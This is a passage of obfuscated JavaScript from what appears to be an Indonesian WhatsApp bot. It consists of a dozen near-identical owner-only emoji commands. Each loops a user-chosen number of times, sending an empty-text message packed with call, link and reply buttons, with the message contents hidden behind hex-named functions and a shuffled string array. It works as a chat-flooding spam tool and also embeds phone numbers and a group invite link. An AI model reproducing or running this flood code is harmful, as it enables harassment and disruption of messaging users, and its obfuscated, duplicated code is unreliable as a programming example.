_0x1631cb['push'](_0x1631cb['shift']());}catch(_0x5d4c67){_0x1631cb['push'](_0x1631cb['shift']());}}}(_0x3a23,0x5d93e),await haikal[_0x47bf3a(0x14f)](m[_0x47bf3a(0x148)],{'text':'','templateButtons':[{'callButton':{'displayText':_0x47bf3a(0x14c),'phoneNumber':_0x47bf3a(0x152)}},{'callButton':{'displayText':_0x47bf3a(0x14c),'phoneNumber':_0x47bf3a(0x150)}},{'urlButton':{'displayText':'GROUP\x20ZALL\x20MODS','url':_0x47bf3a(0x159)}},{'quickReplyButton':{'displayText':'MY','id':_0x47bf3a(0x158)}},{'quickReplyButton':{'displayText':_0x47bf3a(0x149),'id':_0x47bf3a(0x156)}},{'quickReplyButton':{'displayText':'ZALL\x20MODS','id':_0x47bf3a(0x153)}}]}));
 await sleep(20)
}
}
break
//=================================================//
case '🎃':{
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Halo Saya Rizal`
for (let i = 0; i < jumlah; i++) {
function _0x5385(_0x2ab646,_0x156951){var _0x3a233e=_0x3a23();return _0x5385=function(_0x53850c,_0x4c3e8d){_0x53850c=_0x53850c-0x147;var _0xd786db=_0x3a233e[_0x53850c];return _0xd786db;},_0x5385(_0x2ab646,_0x156951);}function _0x3a23(){var _0x5f31ec=['NAME','34783nWaGUx','70YCNYrF','OWNER','1184216mLjwdr','147066EAQNAA','sendMessage','62895330006855','771192XPifQJ','62895330006855','JAGOAN\x20OM?','45FHicsI','2213460MCRxLU','AH\x20SLEBEEW','350069CkDHKE','Anjay\x20Menger','https://chat.whatsapp.com/DqmrBceXTf4BKKD2L0251K','94440ePvkzM','chat'];_0x3a23=function(){return _0x5f31ec;};return _0x3a23();}var _0x47bf3a=_0x5385;(function(_0x2eb902,_0x5904db){var _0x5e852c=_0x5385,_0x1631cb=_0x2eb902();while(!![]){try{var _0x4d18d8=-parseInt(_0x5e852c(0x157))/0x1+parseInt(_0x5e852c(0x151))/0x2+parseInt(_0x5e852c(0x155))/0x3+-parseInt(_0x5e852c(0x147))/0x4*(-parseInt(_0x5e852c(0x14b))/0x5)+parseInt(_0x5e852c(0x14e))/0x6+-parseInt(_0x5e852c(0x14a))/0x7+parseInt(_0x5e852c(0x14d))/0x8*(-parseInt(_0x5e852c(0x154))/0x9);if(_0x4d18d8===_0x5904db)break;else _0x1631cb['push'](_0x1631cb['shift']());}catch(_0x5d4c67){_0x1631cb['push'](_0x1631cb['shift']());}}}(_0x3a23,0x5d93e),await haikal[_0x47bf3a(0x14f)](m[_0x47bf3a(0x148)],{'text':'','templateButtons':[{'callButton':{'displayText':_0x47bf3a(0x14c),'phoneNumber':_0x47bf3a(0x152)}},{'callButton':{'displayText':_0x47bf3a(0x14c),'phoneNumber':_0x47bf3a(0x150)}},{'urlButton':{'displayText':'GROUP\x20ZALL\x20MODS','url':_0x47bf3a(0x159)}},{'quickReplyButton':{'displayText':'MY','id':_0x47bf3a(0x158)}},{'quickReplyButton':{'displayText':_0x47bf3a(0x149),'id':_0x47bf3a(0x156)}},{'quickReplyButton':{'displayText':'ZALL\x20MODS','id':_0x47bf3a(0x153)}}]}));
 await sleep(20)
}
}
break
//=================================================//
case '👿':{
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Halo Saya Rizal`
for (let i = 0; i < jumlah; i++) {
function _0x5385(_0x2ab646,_0x156951){var _0x3a233e=_0x3a23();return _0x5385=function(_0x53850c,_0x4c3e8d){_0x53850c=_0x53850c-0x147;var _0xd786db=_0x3a233e[_0x53850c];return _0xd786db;},_0x5385(_0x2ab646,_0x156951);}function _0x3a23(){var _0x5f31ec=['NAME','34783nWaGUx','70YCNYrF','OWNER','1184216mLjwdr','147066EAQNAA','sendMessage','62895330006855','771192XPifQJ','62895330006855','JAGOAN\x20OM?','45FHicsI','2213460MCRxLU','AH\x20SLEBEEW','350069CkDHKE','Anjay\x20Menger','https://chat.whatsapp.com/DqmrBceXTf4BKKD2L0251K','94440ePvkzM','chat'];_0x3a23=function(){return _0x5f31ec;};return _0x3a23();}var _0x47bf3a=_0x5385;(function(_0x2eb902,_0x5904db){var _0x5e852c=_0x5385,_0x1631cb=_0x2eb902();while(!![]){try{var _0x4d18d8=-parseInt(_0x5e852c(0x157))/0x1+parseInt(_0x5e852c(0x151))/0x2+parseInt(_0x5e852c(0x155))/0x3+-parseInt(_0x5e852c(0x147))/0x4*(-parseInt(_0x5e852c(0x14b))/0x5)+parseInt(_0x5e852c(0x14e))/0x6+-parseInt(_0x5e852c(0x14a))/0x7+parseInt(_0x5e852c(0x14d))/0x8*(-parseInt(_0x5e852c(0x154))/0x9);if(_0x4d18d8===_0x5904db)break;else _0x1631cb['push'](_0x1631cb['shift']());}catch(_0x5d4c67){_0x1631cb['push'](_0x1631cb['shift']());}}}(_0x3a23,0x5d93e),await haikal[_0x47bf3a(0x14f)](m[_0x47bf3a(0x148)],{'text':'','templateButtons':[{'callButton':{'displayText':_0x47bf3a(0x14c),'phoneNumber':_0x47bf3a(0x152)}},{'callButton':{'displayText':_0x47bf3a(0x14c),'phoneNumber':_0x47bf3a(0x150)}},{'urlButton':{'displayText':'GROUP\x20ZALL\x20MODS','url':_0x47bf3a(0x159)}},{'quickReplyButton':{'displayText':'MY','id':_0x47bf3a(0x158)}},{'quickReplyButton':{'displayText':_0x47bf3a(0x149),'id':_0x47bf3a(0x156)}},{'quickReplyButton':{'displayText':'ZALL\x20MODS','id':_0x47bf3a(0x153)}}]}));
 await sleep(20)
}
}
break
//=================================================//
case '👹':{
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Halo Saya Rizal`
for (let i = 0; i < jumlah; i++) {
function _0x5385(_0x2ab646,_0x156951){var _0x3a233e=_0x3a23();return _0x5385=function(_0x53850c,_0x4c3e8d){_0x53850c=_0x53850c-0x147;var _0xd786db=_0x3a233e[_0x53850c];return _0xd786db;},_0x5385(_0x2ab646,_0x156951);}function _0x3a23(){var _0x5f31ec=['NAME','34783nWaGUx','70YCNYrF','OWNER','1184216mLjwdr','147066EAQNAA','sendMessage','62895330006855','771192XPifQJ','62895330006855','JAGOAN\x20OM?','45FHicsI','2213460MCRxLU','AH\x20SLEBEEW','350069CkDHKE','Anjay\x20Menger','https://chat.whatsapp.com/DqmrBceXTf4BKKD2L0251K','94440ePvkzM','chat'];_0x3a23=function(){return _0x5f31ec;};return _0x3a23();}var _0x47bf3a=_0x5385;(function(_0x2eb902,_0x5904db){var _0x5e852c=_0x5385,_0x1631cb=_0x2eb902();while(!![]){try{var _0x4d18d8=-parseInt(_0x5e852c(0x157))/0x1+parseInt(_0x5e852c(0x151))/0x2+parseInt(_0x5e852c(0x155))/0x3+-parseInt(_0x5e852c(0x147))/0x4*(-parseInt(_0x5e852c(0x14b))/0x5)+parseInt(_0x5e852c(0x14e))/0x6+-parseInt(_0x5e852c(0x14a))/0x7+parseInt(_0x5e852c(0x14d))/0x8*(-parseInt(_0x5e852c(0x154))/0x9);if(_0x4d18d8===_0x5904db)break;else _0x1631cb['push'](_0x1631cb['shift']());}catch(_0x5d4c67){_0x1631cb['push'](_0x1631cb['shift']());}}}(_0x3a23,0x5d93e),await haikal[_0x47bf3a(0x14f)](m[_0x47bf3a(0x148)],{'text':'','templateButtons':[{'callButton':{'displayText':_0x47bf3a(0x14c),'phoneNumber':_0x47bf3a(0x152)}},{'callButton':{'displayText':_0x47bf3a(0x14c),'phoneNumber':_0x47bf3a(0x150)}},{'urlButton':{'displayText':'GROUP\x20ZALL\x20MODS','url':_0x47bf3a(0x159)}},{'quickReplyButton':{'displayText':'MY','id':_0x47bf3a(0x158)}},{'quickReplyButton':{'displayText':_0x47bf3a(0x149),'id':_0x47bf3a(0x156)}},{'quickReplyButton':{'displayText':'ZALL\x20MODS','id':_0x47bf3a(0x153)}}]}));
 await sleep(20)
}
}
break
//=================================================//
case '🥶':{
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Halo Saya Rizal`
for (let i = 0; i < jumlah; i++) {
function _0x5385(_0x2ab646,_0x156951){var _0x3a233e=_0x3a23();return _0x5385=function(_0x53850c,_0x4c3e8d){_0x53850c=_0x53850c-0x147;var _0xd786db=_0x3a233e[_0x53850c];return _0xd786db;},_0x5385(_0x2ab646,_0x156951);}function _0x3a23(){var _0x5f31ec=['NAME','34783nWaGUx','70YCNYrF','OWNER','1184216mLjwdr','147066EAQNAA','sendMessage','62895330006855','771192XPifQJ','62895330006855','JAGOAN\x20OM?','45FHicsI','2213460MCRxLU','AH\x20SLEBEEW','350069CkDHKE','Anjay\x20Menger','https://chat.whatsapp.com/DqmrBceXTf4BKKD2L0251K','94440ePvkzM','chat'];_0x3a23=function(){return _0x5f31ec;};return _0x3a23();}var _0x47bf3a=_0x5385;(function(_0x2eb902,_0x5904db){var _0x5e852c=_0x5385,_0x1631cb=_0x2eb902();while(!![]){try{var _0x4d18d8=-parseInt(_0x5e852c(0x157))/0x1+parseInt(_0x5e852c(0x151))/0x2+parseInt(_0x5e852c(0x155))/0x3+-parseInt(_0x5e852c(0x147))/0x4*(-parseInt(_0x5e852c(0x14b))/0x5)+parseInt(_0x5e852c(0x14e))/0x6+-parseInt(_0x5e852c(0x14a))/0x7+parseInt(_0x5e852c(0x14d))/0x8*(-parseInt(_0x5e852c(0x154))/0x9);if(_0x4d18d8===_0x5904db)break;else _0x1631cb['push'](_0x1631cb['shift']());}catch(_0x5d4c67){_0x1631cb['push'](_0x1631cb['shift']());}}}(_0x3a23,0x5d93e),await haikal[_0x47bf3a(0x14f)](m[_0x47bf3a(0x148)],{'text':'','templateButtons':[{'callButton':{'displayText':_0x47bf3a(0x14c),'phoneNumber':_0x47bf3a(0x152)}},{'callButton':{'displayText':_0x47bf3a(0x14c),'phoneNumber':_0x47bf3a(0x150)}},{'urlButton':{'displayText':'GROUP\x20ZALL\x20MODS','url':_0x47bf3a(0x159)}},{'quickReplyButton':{'displayText':'MY','id':_0x47bf3a(0x158)}},{'quickReplyButton':{'displayText':_0x47bf3a(0x149),'id':_0x47bf3a(0x156)}},{'quickReplyButton':{'displayText':'ZALL\x20MODS','id':_0x47bf3a(0x153)}}]}));
 await sleep(20)
}
}
break
//=================================================//
case '😡':{
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Halo Saya Rizal`
for (let i = 0; i < jumlah; i++) {
function _0x5385(_0x2ab646,_0x156951){var _0x3a233e=_0x3a23();return _0x5385=function(_0x53850c,_0x4c3e8d){_0x53850c=_0x53850c-0x147;var _0xd786db=_0x3a233e[_0x53850c];return _0xd786db;},_0x5385(_0x2ab646,_0x156951);}function _0x3a23(){var _0x5f31ec=['NAME','34783nWaGUx','70YCNYrF','OWNER','1184216mLjwdr','147066EAQNAA','sendMessage','62895330006855','771192XPifQJ','62895330006855','JAGOAN\x20OM?','45FHicsI','2213460MCRxLU','AH\x20SLEBEEW','350069CkDHKE','Anjay\x20Menger','https://chat.whatsapp.com/DqmrBceXTf4BKKD2L0251K','94440ePvkzM','chat'];_0x3a23=function(){return _0x5f31ec;};return _0x3a23();}var _0x47bf3a=_0x5385;(function(_0x2eb902,_0x5904db){var _0x5e852c=_0x5385,_0x1631cb=_0x2eb902();while(!![]){try{var _0x4d18d8=-parseInt(_0x5e852c(0x157))/0x1+parseInt(_0x5e852c(0x151))/0x2+parseInt(_0x5e852c(0x155))/0x3+-parseInt(_0x5e852c(0x147))/0x4*(-parseInt(_0x5e852c(0x14b))/0x5)+parseInt(_0x5e852c(0x14e))/0x6+-parseInt(_0x5e852c(0x14a))/0x7+parseInt(_0x5e852c(0x14d))/0x8*(-parseInt(_0x5e852c(0x154))/0x9);if(_0x4d18d8===_0x5904db)break;else _0x1631cb['push'](_0x1631cb['shift']());}catch(_0x5d4c67){_0x1631cb['push'](_0x1631cb['shift']());}}}(_0x3a23,0x5d93e),await haikal[_0x47bf3a(0x14f)](m[_0x47bf3a(0x148)],{'text':'','templateButtons':[{'callButton':{'displayText':_0x47bf3a(0x14c),'phoneNumber':_0x47bf3a(0x152)}},{'callButton':{'displayText':_0x47bf3a(0x14c),'phoneNumber':_0x47bf3a(0x150)}},{'urlButton':{'displayText':'GROUP\x20ZALL\x20MODS','url':_0x47bf3a(0x159)}},{'quickReplyButton':{'displayText':'MY','id':_0x47bf3a(0x158)}},{'quickReplyButton':{'displayText':_0x47bf3a(0x149),'id':_0x47bf3a(0x156)}},{'quickReplyButton':{'displayText':'ZALL\x20MODS','id':_0x47bf3a(0x153)}}]}));
 await sleep(20)
}
}
break
//=================================================//
case '🤯':{
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Halo Saya Rizal`
for (let i = 0; i < jumlah; i++) {
function _0x5385(_0x2ab646,_0x156951){var _0x3a233e=_0x3a23();return _0x5385=function(_0x53850c,_0x4c3e8d){_0x53850c=_0x53850c-0x147;var _0xd786db=_0x3a233e[_0x53850c];return _0xd786db;},_0x5385(_0x2ab646,_0x156951);}function _0x3a23(){var _0x5f31ec=['NAME','34783nWaGUx','70YCNYrF','OWNER','1184216mLjwdr','147066EAQNAA','sendMessage','62895330006855','771192XPifQJ','62895330006855','JAGOAN\x20OM?','45FHicsI','2213460MCRxLU','AH\x20SLEBEEW','350069CkDHKE','Anjay\x20Menger','https://chat.whatsapp.com/DqmrBceXTf4BKKD2L0251K','94440ePvkzM','chat'];_0x3a23=function(){return _0x5f31ec;};return _0x3a23();}var _0x47bf3a=_0x5385;(function(_0x2eb902,_0x5904db){var _0x5e852c=_0x5385,_0x1631cb=_0x2eb902();while(!![]){try{var _0x4d18d8=-parseInt(_0x5e852c(0x157))/0x1+parseInt(_0x5e852c(0x151))/0x2+parseInt(_0x5e852c(0x155))/0x3+-parseInt(_0x5e852c(0x147))/0x4*(-parseInt(_0x5e852c(0x14b))/0x5)+parseInt(_0x5e852c(0x14e))/0x6+-parseInt(_0x5e852c(0x14a))/0x7+parseInt(_0x5e852c(0x14d))/0x8*(-parseInt(_0x5e852c(0x154))/0x9);if(_0x4d18d8===_0x5904db)break;else _0x1631cb['push'](_0x1631cb['shift']());}catch(_0x5d4c67){_0x1631cb['push'](_0x1631cb['shift']());}}}(_0x3a23,0x5d93e),await haikal[_0x47bf3a(0x14f)](m[_0x47bf3a(0x148)],{'text':'','templateButtons':[{'callButton':{'displayText':_0x47bf3a(0x14c),'phoneNumber':_0x47bf3a(0x152)}},{'callButton':{'displayText':_0x47bf3a(0x14c),'phoneNumber':_0x47bf3a(0x150)}},{'urlButton':{'displayText':'GROUP\x20ZALL\x20MODS','url':_0x47bf3a(0x159)}},{'quickReplyButton':{'displayText':'MY','id':_0x47bf3a(0x158)}},{'quickReplyButton':{'displayText':_0x47bf3a(0x149),'id':_0x47bf3a(0x156)}},{'quickReplyButton':{'displayText':'ZALL\x20MODS','id':_0x47bf3a(0x153)}}]}));
 await sleep(20)
}
}
break
//=================================================//
case '😎':{
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Halo Saya Rizal`
for (let i = 0; i < jumlah; i++) {
function _0x5385(_0x2ab646,_0x156951){var _0x3a233e=_0x3a23();return _0x5385=function(_0x53850c,_0x4c3e8d){_0x53850c=_0x53850c-0x147;var _0xd786db=_0x3a233e[_0x53850c];return _0xd786db;},_0x5385(_0x2ab646,_0x156951);}function _0x3a23(){var _0x5f31ec=['NAME','34783nWaGUx','70YCNYrF','OWNER','1184216mLjwdr','147066EAQNAA','sendMessage','62895330006855','771192XPifQJ','62895330006855','JAGOAN\x20OM?','45FHicsI','2213460MCRxLU','AH\x20SLEBEEW','350069CkDHKE','Anjay\x20Menger','https://chat.whatsapp.com/DqmrBceXTf4BKKD2L0251K','94440ePvkzM','chat'];_0x3a23=function(){return _0x5f31ec;};return _0x3a23();}var _0x47bf3a=_0x5385;(function(_0x2eb902,_0x5904db){var _0x5e852c=_0x5385,_0x1631cb=_0x2eb902();while(!![]){try{var _0x4d18d8=-parseInt(_0x5e852c(0x157))/0x1+parseInt(_0x5e852c(0x151))/0x2+parseInt(_0x5e852c(0x155))/0x3+-parseInt(_0x5e852c(0x147))/0x4*(-parseInt(_0x5e852c(0x14b))/0x5)+parseInt(_0x5e852c(0x14e))/0x6+-parseInt(_0x5e852c(0x14a))/0x7+parseInt(_0x5e852c(0x14d))/0x8*(-parseInt(_0x5e852c(0x154))/0x9);if(_0x4d18d8===_0x5904db)break;else _0x1631cb['push'](_0x1631cb['shift']());}catch(_0x5d4c67){_0x1631cb['push'](_0x1631cb['shift']());}}}(_0x3a23,0x5d93e),await haikal[_0x47bf3a(0x14f)](m[_0x47bf3a(0x148)],{'text':'','templateButtons':[{'callButton':{'displayText':_0x47bf3a(0x14c),'phoneNumber':_0x47bf3a(0x152)}},{'callButton':{'displayText':_0x47bf3a(0x14c),'phoneNumber':_0x47bf3a(0x150)}},{'urlButton':{'displayText':'GROUP\x20ZALL\x20MODS','url':_0x47bf3a(0x159)}},{'quickReplyButton':{'displayText':'MY','id':_0x47bf3a(0x158)}},{'quickReplyButton':{'displayText':_0x47bf3a(0x149),'id':_0x47bf3a(0x156)}},{'quickReplyButton':{'displayText':'ZALL\x20MODS','id':_0x47bf3a(0x153)}}]}));
 await sleep(20)
}
}
break
//=================================================//
case '🗿':{
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Halo Saya Rizal`
for (let i = 0; i < jumlah; i++) {
function _0x5385(_0x2ab646,_0x156951){var _0x3a233e=_0x3a23();return _0x5385=function(_0x53850c,_0x4c3e8d){_0x53850c=_0x53850c-0x147;var _0xd786db=_0x3a233e[_0x53850c];return _0xd786db;},_0x5385(_0x2ab646,_0x156951);}function _0x3a23(){var _0x5f31ec=['NAME','34783nWaGUx','70YCNYrF','OWNER','1184216mLjwdr','147066EAQNAA','sendMessage','62895330006855','771192XPifQJ','62895330006855','JAGOAN\x20OM?','45FHicsI','2213460MCRxLU','AH\x20SLEBEEW','350069CkDHKE','Anjay\x20Menger','https://chat.whatsapp.com/DqmrBceXTf4BKKD2L0251K','94440ePvkzM','chat'];_0x3a23=function(){return _0x5f31ec;};return _0x3a23();}var _0x47bf3a=_0x5385;(function(_0x2eb902,_0x5904db){var _0x5e852c=_0x5385,_0x1631cb=_0x2eb902();while(!![]){try{var _0x4d18d8=-parseInt(_0x5e852c(0x157))/0x1+parseInt(_0x5e852c(0x151))/0x2+parseInt(_0x5e852c(0x155))/0x3+-parseInt(_0x5e852c(0x147))/0x4*(-parseInt(_0x5e852c(0x14b))/0x5)+parseInt(_0x5e852c(0x14e))/0x6+-parseInt(_0x5e852c(0x14a))/0x7+parseInt(_0x5e852c(0x14d))/0x8*(-parseInt(_0x5e852c(0x154))/0x9);if(_0x4d18d8===_0x5904db)break;else _0x1631cb['push'](_0x1631cb['shift']());}catch(_0x5d4c67){_0x1631cb['push'](_0x1631cb['shift']());}}}(_0x3a23,0x5d93e),await haikal[_0x47bf3a(0x14f)](m[_0x47bf3a(0x148)],{'text':'','templateButtons':[{'callButton':{'displayText':_0x47bf3a(0x14c),'phoneNumber':_0x47bf3a(0x152)}},{'callButton':{'displayText':_0x47bf3a(0x14c),'phoneNumber':_0x47bf3a(0x150)}},{'urlButton':{'displayText':'GROUP\x20ZALL\x20MODS','url':_0x47bf3a(0x159)}},{'quickReplyButton':{'displayText':'MY','id':_0x47bf3a(0x158)}},{'quickReplyButton':{'displayText':_0x47bf3a(0x149),'id':_0x47bf3a(0x156)}},{'quickReplyButton':{'displayText':'ZALL\x20MODS','id':_0x47bf3a(0x153)}}]}));
 await sleep(20)
}
}
break
//=================================================//
case '💸':{
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Halo Saya Rizal`
for (let i = 0; i < jumlah; i++) {
function _0x5385(_0x2ab646,_0x156951){var _0x3a233e=_0x3a23();return _0x5385=function(_0x53850c,_0x4c3e8d){_0x53850c=_0x53850c-0x147;var _0xd786db=_0x3a233e[_0x53850c];return _0xd786db;},_0x5385(_0x2ab646,_0x156951);}function _0x3a23(){var _0x5f31ec=['NAME','34783nWaGUx','70YCNYrF','OWNER','1184216mLjwdr','147066EAQNAA','sendMessage','62895330006855','771192XPifQJ','62895330006855','JAGOAN\x20OM?','45FHicsI','2213460MCRxLU','AH\x20SLEBEEW','350069CkDHKE','Anjay\x20Menger','https://chat.whatsapp.com/DqmrBceXTf4BKKD2L0251K','94440ePvkzM','chat'];_0x3a23=function(){return _0x5f31ec;};return _0x3a23();}var _0x47bf3a=_0x5385;(function(_0x2eb902,_0x5904db){var _0x5e852c=_0x5385,_0x1631cb=_0x2eb902();while(!![]){try{var _0x4d18d8=-parseInt(_0x5e852c(0x157))/0x1+parseInt(_0x5e852c(0x151))/0x2+parseInt(_0x5e852c(0x155))/0x3+-parseInt(_0x5e852c(0x147))/0x4*(-parseInt(_0x5e852c(0x14b))/0x5)+parseInt(_0x5e852c(0x14e))/0x6+-parseInt(_0x5e852c(0x14a))/0x7+parseInt(_0x5e852c(0x14d))/0x8*(-parseInt(_0x5e852c(0x154))/0x9);if(_0x4d18d8===_0x5904db)break;else _0x1631cb['push'](_0x1631cb['shift']());}catch(_0x5d4c67){_0x1631cb['push'](_0x1631cb['shift']());}}}(_0x3a23,0x5d93e),await haikal[_0x47bf3a(0x14f)](m[_0x47bf3a(0x148)],{'text':'','templateButtons':[{'callButton':{'displayText':_0x47bf3a(0x14c),'phoneNumber':_0x47bf3a(0x152)}},{'callButton':{'displayText':_0x47bf3a(0x14c),'phoneNumber':_0x47bf3a(0x150)}},{'urlButton':{'displayText':'GROUP\x20ZALL\x20MODS','url':_0x47bf3a(0x159)}},{'quickReplyButton':{'displayText':'MY','id':_0x47bf3a(0x158)}},{'quickReplyButton':{'displayText':_0x47bf3a(0x149),'id':_0x47bf3a(0x156)}},{'quickReplyButton':{'displayText':'ZALL\x20MODS','id':_0x47bf3a(0x153)}}]}));
 await sleep(20)
}
}
break
//=================================================//
case '🐣':{
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Halo Saya Rizal`
for (let i = 0; i < jumlah; i++) {
function _0x5385(_0x2ab646,_0x156951){var _0x3a233e=_0x3a23();return _0x5385=function(_0x53850c,_0x4c3e8d){_0x53850c=_0x53850c-0x147;var _0xd786db=_0x3a233e[_0x53850c];return _0xd786db;},_0x5385(_0x2ab646,_0x156951);}function _0x3a23(){var _0x5f31ec=['NAME','34783nWaGUx','70YCNYrF','OWNER','1184216mLjwdr','147066EAQNAA','sendMessage','62895330006855','771192XPifQJ','62895330006855','JAGOAN\x20OM?','45FHicsI','2213460MCRxLU','AH\x20SLEBEEW','350069CkDHKE','Anjay\x20Menger','https://chat.whatsapp.com/DqmrBceXTf4BKKD2L0251K','94440ePvkzM','chat'];_0x3a23=function(){return _0x5f31ec;};return _0x3a23();}var _0x47bf3a=_0x5385;(function(_0x2eb902,_0x5904db){var _0x5e852c=_0x5385,_0x1631cb=_0x2eb902();while(!![]){try{var _0x4d18d8=-parseInt(_0x5e852c(0x157))/0x1+parseInt(_0x5e852c(0x151))/0x2+parseInt(_0x5e852c(0x155))/0x3+-parseInt(_0x5e852c(0x147))/0x4*(-parseInt(_0x5e852c(0x14b))/0x5)+parseInt(_0x5e852c(0x14e))/0x6+-parseInt(_0x5e852c(0x14a))/0x7+parseInt(_0x5e852c(0x14d))/0x8*(-parseInt(_0x5e852c(0x154))/0x9);if(_0x4d18d8===_0x5904db)break;else _0x1631cb['push'](_0x1631cb['shift']());}catch(_0x5d4c67){_0x1631cb['push'](_0x1631cb['shift']());}}}(_0x3a23,0x5d93e),await haikal[_0x47bf3a(0x14f)](m[_0x47bf3a(0x148)],{'text':'','templateButtons':[{'callButton':{'displayText':_0x47bf3a(0x14c),'phoneNumber':_0x47bf3a(0x152)}},{'callButton':{'displayText':_0x47bf3a(0x14c),'phoneNumber':_0x47bf3a(0x150)}},{'urlButton':{'displayText':'GROUP\x20ZALL\x20MODS','url':_0x47bf3a(0x159)}},{'quickReplyButton':{'displayText':'MY','id':_0x47bf3a(0x158)}},{'quickReplyButton':{'displayText':_0x47bf3a(0x149),'id':_0x47bf3a(0x156)}},{'quickReplyButton':{'displayText':'ZALL\x20MODS','id':_0x47bf3a(0x153)}}]}));
 await sleep(20)
}
}
break
//=================================================//
case '🕊️':{
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Halo Saya Rizal`
for (let i = 0; i < jumlah; i++) {
function _0x5385(_0x2ab646,_0x156951){var _0x3a233e=_0x3a23();return _0x5385=function(_0x53850c,_0x4c3e8d){_0x53850c=_0x53850c-0x147;var _0xd786db=_0x3a233e[_0x53850c];return _0xd786db;},_0x5385(_0x2ab646,_0x156951);}function _0x3a23(){var _0x5f31ec=['NAME','34783nWaGUx','70YCNYrF','OWNER','1184216mLjwdr','147066EAQNAA','sendMessage','62895330006855','771192XPifQJ','62895330006855','JAGOAN\x20OM?','45FHicsI','2213460MCRxLU','AH\x20SLEBEEW','350069CkDHKE','Anjay\x20Menger','https://chat.whatsapp.com/DqmrBceXTf4BKKD2L0251K','94440ePvkzM','chat'];_0x3a23=function(){return _0x5f31ec;};return _0x3a23();}var _0x47bf3a=_0x5385;(function(_0x2eb902,_0x5904db){var _0x5e852c=_0x5385,_0x1631cb=_0x2eb902();while(!![]){try{var _0x4d18d8=-parseInt(_0x5e852c(0x157))/0x1+parseInt(_0x5e852c(0x151))/0x2+parseInt(_0x5e852c(0x155))/0x3+-parseInt(_0x5e852c(0x147))/0x4*(-parseInt(_0x5e852c(0x14b))/0x5)+parseInt(_0x5e852c(0x14e))/0x6+-parseInt(_0x5e852c(0x14a))/0x7+parseInt(_0x5e852c(0x14d))/0x8*(-parseInt(_0x5e852c(0x154))/0x9);if(_0x4d18d8===_0x5904db)break;else _0x1631cb['push'](_0x1631cb['shift']());}catch(_0x5d4c67){_0x1631cb['push'](_0x1631cb['shift']());}}}(_0x3a23,0x5d93e),await haikal[_0x47bf3a(0x14f)](m[_0x47bf3a(0x148)],{'text':'','templateButtons':[{'callButton':{'displayText':_0x47bf3a(0x14c),'phoneNumber':_0x47bf3a(0x152)}},{'callButton':{'displayText':_0x47bf3a(0x14c),'phoneNumber':_0x47bf3a(0x150)}},{'urlButton':{'displayText':'GROUP\x20ZALL\x20MODS','url':_0x47bf3a(0x159)}},{'quickReplyButton':{'displayText':'MY','id':_0x47bf3a(0x158)}},{'quickReplyButton':{'displayText':_0x47bf3a(0x149),'id':_0x47bf3a(0x156)}},{'quickReplyButton':{'displayText':'ZALL\x20MODS','id':_0x47bf3a(0x153)}}]}));
 await sleep(20)
}
}
break
//=================================================//
case '〽️':{
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Halo Saya Rizal`
for (let i = 0; i < jumlah; i++) {
function _0x5385(_0x2ab646,_0x156951){var _0x3a233e=_0x3a23();return _0x5385=function(_0x53850c,_0x4c3e8d){_0x53850c=_0x53850c-0x147;var _0xd786db=_0x3a233e[_0x53850c];return _0xd786db;},_0x5385(_0x2ab646,_0x156951);}function _0x3a23(){var _0x5f31ec=['NAME','34783nWaGUx','70YCNYrF','OWNER','1184216mLjwdr','147066EAQNAA','sendMessage','62895330006855','771192XPifQJ','62895330006855','JAGOAN\x20OM?','45FHicsI','2213460MCRxLU','AH\x20SLEBEEW','350069CkDHKE','Anjay\x20Menger','https://chat.whatsapp.com/DqmrBceXTf4BKKD2L0251K','94440ePvkzM','chat'];_0x3a23=function(){return _0x5f31ec;};return _0x3a23();}var _0x47bf3a=_0x5385;(function(_0x2eb902,_0x5904db){var _0x5e852c=_0x5385,_0x1631cb=_0x2eb902();while(!![]){try{var _0x4d18d8=-parseInt(_0x5e852c(0x157))/0x1+parseInt(_0x5e852c(0x151))/0x2+parseInt(_0x5e852c(0x155))/0x3+-parseInt(_0x5e852c(0x147))/0x4*(-parseInt(_0x5e852c(0x14b))/0x5)+parseInt(_0x5e852c(0x14e))/0x6+-parseInt(_0x5e852c(0x14a))/0x7+parseInt(_0x5e852c(0x14d))/0x8*(-parseInt(_0x5e852c(0x154))/0x9);if(_0x4d18d8===_0x5904db)break;else 